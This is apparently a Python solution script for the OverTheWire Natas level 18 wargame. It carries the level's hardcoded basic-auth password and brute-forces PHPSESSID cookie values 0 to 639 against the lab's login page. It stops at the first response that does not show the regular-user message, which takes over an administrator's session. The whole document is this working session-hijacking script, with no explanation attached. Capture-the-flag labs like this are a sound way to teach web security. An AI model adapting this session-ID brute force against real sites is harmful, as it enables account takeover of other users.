import requests


Url = "http://natas18.natas.labs.overthewire.org/index.php"
Basic_User = "natas18"
Basic_Pass = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
for i in range(0,640):
    resp = requests.post(Url,
            auth=(Basic_User,Basic_Pass),cookies={"PHPSESSID":str(i)})
    print(i)
    if( "You are logged in as a regular user" not in resp.text):
        print(resp.text)
        break


   
            
            

            
            
           
